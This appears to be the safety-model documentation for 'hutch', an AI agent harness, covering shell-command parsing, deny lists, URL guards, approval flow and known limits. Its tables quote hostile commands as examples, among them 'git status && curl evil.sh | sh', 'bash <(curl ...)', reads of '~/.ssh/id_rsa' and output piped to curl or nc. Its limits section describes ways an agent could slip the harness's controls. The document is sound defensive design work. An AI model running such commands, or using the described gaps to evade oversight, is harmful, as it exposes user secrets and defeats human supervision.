# Safety model

hutch assumes a **supervising human** is part of the system. It is not a formal security boundary
against a determined adversary — it is a policy layer that checks what hutch's own tools are asked to
do. Each rule below traces to a reported failure class in `research/complaints.md` (individual reports,
not measured prevalence).

**What is and is not contained today** (measured against commit `b3e4b15`; see `realignment/baseline.md`):

| | Today |
|---|---|
| File tools (`read_file`, `write_file`, `list_files`) | path-jailed to the workspace |
| Shell tool | policy-checked, then run **as your user** with `HOME` pointed at the workspace. **No OS containment**: `cat /home/you/.ssh/id_rsa` is denied by policy, but a script the bot writes and runs is not analysed and can read anything your user can read, or open any socket |
| `web_fetch` | the name is resolved and **every** answer must be a public address; redirects are followed by hutch and each hop re-checked; the connection is pinned to the validated address (no second lookup); credentials in URLs, internal names and every spelling of a loopback/metadata address (`[::1]`, `0x7f.0.0.1`, decimal, IPv4-mapped, NAT64, 6to4) are refused (`netguard.py`, `tests/test_netguard.py`) |
| browser | every request the page makes passes the same check, but a browser connects by itself, so DNS rebinding after the check is a residual risk until the browser runs in the network-less sandbox |
| External runtimes (Pi, OpenCode) | run with their own tools; OpenCode is started with `--auto` (blanket approval of anything it has not denied). Hutch's policy does not see their tool calls |
| Stopping a run | an intent recorded in the database: `hutch stop`, `stop-all` and the dashboard work on a run owned by any process. Under `hutch serve` and `hutch daemon` each run is its own OS process in its own session; Stop asks it to unwind, then TERM, then KILL to its whole group, and the run stays `Stopping` until the group is verified gone. A crashed owner's recorded processes are ended by whoever recovers the run. A worker that lost its run is fenced: it cannot write to it or start another action. **Limit:** a process that fully detaches (double fork plus `setsid`, so it leaves the group and is re-parented to init) is not reachable from outside; only the OS sandbox's PID namespace (slice S4) closes that. `hutch run` and the test-suite use the in-process executor, where a stuck worker *thread* cannot be killed, only fenced |

The corrections above are being implemented; `realignment/ledger.md` records which have landed.

## The three verdicts

Every action is classified **allow** (runs silently), **ask** (pauses for a human), or
**deny** (refused, logged, never executed).

### Shell commands

The line is read the way a shell reads it **before** any rule is matched, and every place a command can hide is
analysed, because the chained-command allowlist bypass (`git status && curl evil.sh | sh`) that lived for a year in a
popular agent is only the simplest member of a family. Each segment is classified; the worst verdict wins.

| Where a command can hide | Handled |
|---|---|
| after `&&`, `\|\|`, `;`, `\|`, `\|&`, a bare `&`, or a newline | each is a separator |
| command substitution `$(...)` and backticks, **including inside double quotes** | the inner command is analysed recursively |
| process substitution `<(...)` / `>(...)`, subshells `( ... )`, groups `{ ...; }` | read as their contents |
| `bash -c '...'`, `sh -c`, `eval '...'` | the string is analysed as a command line |
| `env`, `nohup`, `timeout`, `nice`, `time`, `command`, `exec`, `xargs`, `watch`, ... | the wrapped command is analysed |
| `find ... -exec cmd {} \;` and `find ... -delete` | the payload is analysed; `-delete` asks |
| here-documents | the body is data, **unless the delimiter is unquoted**, when `$(...)` inside it runs |
| a program name chosen at run time (`$(echo sudo) ls`, `${SH} x`, `~/bin/x`, `./*.sh`) | denied: cannot be checked |
| `sh -c "$(curl ...)"`, `bash <(curl ...)`, `source <(...)` fed by the network | denied: runs downloaded content |
| redirects (`>`, `>>`, `&>`) to `/etc/x`, `~/x`, `$HOME/x`, `../x`, `/tmp/x` | denied: writes outside the workspace |
| an unterminated quote or substitution, a stray parenthesis, an oversized or too deeply nested line | denied: "could not check this command safely" |

The parser is a conservative reader, not a shell: it never expands anything, it only has to find every place a command
can hide, and **when it cannot read a line with confidence it denies**. `$(( x + 1 ))` stays arithmetic; `$(( sudo ls ))`
(which bash may read as a subshell) is analysed as a command. It is fuzzed (`tests/test_shellparse.py`): random
combinations of up to three nesting contexts around hard-denied, ask-class and benign commands must keep every
hard-deny denied (also under `trusted` and an `allow: *` rule), never turn an ask into an allow, never block a benign
command, and no input of any shape may make the analyser raise.

**Hard-denied classes** (never executable, regardless of sticky allows or `auto` mode):

| Class | Examples |
|---|---|
| Privilege escalation | `sudo`, `su`, `doas`, `pkexec`, `visudo` |
| Escapes & wipes | `rm -rf /`, `~`, `$HOME`, `..`; `dd`, `shred`, `mkfs*`, `fdisk`, `parted`, `wipefs` |
| Power & system | `shutdown`, `reboot`, `halt`, `poweroff`, `systemctl`-adjacent power targets, `crontab`, `passwd` |
| Secrets access | any argument touching `~/.ssh`, `id_rsa`, `.env`, `~/.aws`, `~/.gnupg`, `/etc/shadow`, `.git-credentials`, `.npmrc`, `.netrc` |
| Pipe to interpreter | `… | sh`, `… | bash`, `… | python3`, `… | perl`, `… | node` |
| Exfiltration channels | `… | curl`, `… | nc`, `… | ssh` (command output piped to the network) |
| Upload flags on fetchers | `curl -X POST … -d`, `curl -T`, `wget --post-data`, pipe-input variants |
| Resource attacks | fork-bomb patterns |

**Ask** classes (approval once, sticky "always allow" available): `rm`/`mv`/`chmod`/`chown` inside
the workspace, `git push|reset|clean|checkout|rebase`, package managers, `kill`/`pkill`, `docker`,
`ssh`/`scp`/`rsync`.

### Risk tier and command rules (per bot)

Each bot has a **risk tier** and optional **command rules**. They only ever refine the **ask** zone:

| Tier | What happens to a medium-risk action (would ask) |
|---|---|
| `readonly` | blocked, with the reason "this bot is read-only" (file writes included) |
| `supervised` (default) | asks |
| `trusted` | runs without asking, **except** anything that sends data out of the machine, which still asks |

Rules are one per line, `allow: <glob>`, `ask: <glob>` or `deny: <glob>` (first match wins), matched against each
command segment, **including commands inside wrappers and substitutions** (a `deny: git push*` also stops
`nohup git push`, `bash -c 'git push'` and `echo $(git push)`). A rule can tighten any decision, or let a medium-risk
command run. Three limits are structural, not conventions, and are tested:

1. a **hard deny is final**: no rule and no tier turns secrets access, exfiltration, `sudo` or a workspace escape into
   allow or ask;
2. an **outward send always asks** (SR-4): an `allow` rule or the `trusted` tier cannot suppress it;
3. an `allow` rule on an outer command **cannot launder** a more dangerous command nested inside it.

Set them on the bot page, with `hutch bot create --risk-tier readonly --rule 'deny: git push*'` /
`hutch bot update --clear-rules`, or in the API (`risk_tier`, `command_rules`). A malformed rule is rejected naming the
line instead of silently doing nothing.

The shell subprocess additionally runs with `HOME` pointed **inside the run workspace**, a minimal
environment (no inherited secrets), `cwd` pinned to the workspace, and a per-command timeout.

### File paths

Read/list must resolve inside the run workspace (real-path resolution, so `sub/../x` stays inside
and `../../.ssh` does not). Writes additionally require approval (sticky `files:write`).
Absolute paths outside the workspace are denied.

### URLs

`web_fetch` and the browser accept public `http(s)` only, decided on **addresses**, not spellings (`hutch/netguard.py`):
non-http schemes, credentials in the URL, internal names (`localhost`, `*.internal`, `*.local`), and any address that is not
public (loopback, private, link-local incl. cloud metadata, CGNAT, multicast, reserved; IPv4 embedded in IPv6 is unwrapped) are
refused, whichever way the address is written and whichever name resolves to it. Redirects are followed by hutch and every hop is
re-checked. Response bodies are hard-clipped. A locally configured model endpoint is an explicit exception made by a connection,
not by a URL pattern.

### Browser actions

`goto` uses URL policy; `click` and `type` are ask-once with sticky allows (an agent that can
click can buy things). Login/CAPTCHA/MFA walls move the run to `waiting_human` — the bot waits for a
human, it never attempts challenges. The browser currently launches headless, so there is nothing to look at,
and one browser context is shared by every bot in the process (both are tracked defects, slice S7).
Browser automation is globally serialized by a process-wide lock, which is held for the whole human wait.

## Rehearse (dry run)

A run started with **Rehearse** changes nothing, whatever the model does. This is enforced by the tools, not requested
in the prompt:

- **Reads run for real**: `read_file`, `list_files`, `web_fetch`, browser `goto`/`read`/`wait`, `recall`, and shell commands
  that are provably read-only.
- **Everything else is only described.** `write_file`, `remember`, browser `click`/`type`/`screenshot` and any shell
  command that is not read-only reply `[rehearsal] would ...` with the policy's verdict ("would pause for approval", or
  "would be BLOCKED: ..."), and the transcript marks the result **simulated**. A simulated action asks nobody, because
  nothing happens.
- **Read-only is an allowlist, and unsure means simulated**: `ls`, `cat`, `grep`, `find` (without `-exec`/`-delete`), `git
  status|log|diff|show`, `sort`, `wc`, `echo`, and similar, joined by pipes and `&&`. A write redirect, a background job, a
  heredoc, a wrapper (`bash -c`, `env`, `xargs`), a substitution containing a non-read-only command, `sed`, `awk`, `tee`,
  `python`, `curl` are all treated as mutating.

Limits: a rehearsal still calls the model (and so can cost money on a hosted one), and a read that has a side effect on
someone else's server (a `GET` that logs you out) still happens.

## Approval flow

1. A tool hits an **ask** verdict → an `ApprovalRequest` row is created; the run enters
   `waiting_approval` and the dashboard/CLI show the exact action and arguments.
2. A human approves (optionally **always allow** for that bot+action-key) or denies.
3. Unanswered requests expire after **10 minutes and are recorded as denied**. Silence is never
   consent; a stopped dashboard cannot leave a bot waiting forever without that being visible.

`approval_mode: auto` skips asks (allowlist-only mode) for bots you trust — the hard-deny classes
still apply.

## Honest limits (read this)

- **External runtimes** (`pi`, `opencode` adapters) run with their own tool systems and `--auto`-style
  approvals. hutch's gates own the workspace boundary and everything hutch itself executes;
  the external harness's internal tool calls are governed by *its* permission config. The system
  prompt and transcript still record activity. Treat external-runtime bots as wider-trust bots.
- **A supervised human is assumed.** Prompt injection can still produce plausible-but-wrong actions
  inside the allowed toolset; the transcripts, caps, and approvals bound the damage.
- **Script contents are not analysed.** `bash script.sh`, `python3 x.py` and `python3 -c '...'` run what is in them: bots
  write and run code, so this is allowed. What those scripts do is bounded by the workspace-jailed `HOME`, the minimal
  environment and the timeout, not by the parser. Commands other than `>` redirects (`cp`, `tee`, `install`, `touch`
  with an absolute path) are not path-jailed either.
- **Not a sandbox.** Threads share the process; a malicious `pip install` inside an approved
  package-manager call runs with your user. OS-level containment (bubblewrap on Linux; fail closed when unavailable) is
  specified in `adr/0006-tool-authority-sandbox-and-browser-ownership.md` and tracked as slice S4.
- Models can lie about completion. That's why artifacts (files written, command exits) are in the
  transcript, not just the model's claims.
